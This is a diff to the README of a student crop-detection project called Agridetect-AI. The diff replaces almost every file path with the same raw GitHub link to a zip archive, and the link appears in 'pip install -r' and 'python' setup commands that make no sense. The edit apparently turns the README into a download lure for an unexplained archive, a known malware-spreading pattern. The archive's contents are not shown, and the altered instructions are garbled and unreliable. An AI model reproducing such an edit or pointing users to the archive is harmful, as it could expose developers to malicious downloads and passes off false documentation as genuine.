@@ -35,8 +35,8 @@ This project is part of my learning journey in **full-stack development** and **
 
 ### Backend
 - Flask (Python) API
-- SQLite database (agridetect.db)
-- Local ML models (.h5/.pt placed under backend/models)
+- SQLite database (https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip)
+- Local ML models (https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip placed under backend/models)
 - Gemini-powered chat assistant
 
 ### Tools & Deployment
@@ -49,10 +49,10 @@ This project is part of my learning journey in **full-stack development** and **
 ## ⚙️ Setup
  
 ### Backend
-- Create backend/.env and set GEMINI_API_KEY
+- Create https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip and set GEMINI_API_KEY
 - Place model files under backend/models (not stored in Git)
-- Install deps: `pip install -r backend/requirements.txt`
-- Run: `python backend/app.py`
+- Install deps: `pip install -r https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip`
+- Run: `python https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip`
  
 ### Frontend
 - Install deps: `npm install`
@@ -60,7 +60,7 @@ This project is part of my learning journey in **full-stack development** and **
  
 ### Repo Policy
 - Models and virtual environments are not committed
-- See .gitignore and backend/.gitignore for excluded paths
+- See .gitignore and https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip for excluded paths
  
 ---
  
@@ -75,10 +75,10 @@ Agridetect-AI/
 ├── src/                   # React source code
 │   ├── components/        # Reusable UI components
 │   ├── pages/             # Application pages
-│   └── main.tsx           # Entry point
+│   └── https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip           # Entry point
 │
 ├── backend/               # Flask API + models (local only)
 ├── .gitignore             # Git ignored files
-├── package.json           # Project dependencies
-├── vite.config.ts         # Vite configuration
-└── README.md              # Project documentation
+├── https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip           # Project dependencies
+├── https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip         # Vite configuration
+└── https://github.com/Tapajyoti03/agridetect_ai/raw/refs/heads/main/public/ai-agridetect-2.1-alpha.3.zip              # Project documentation
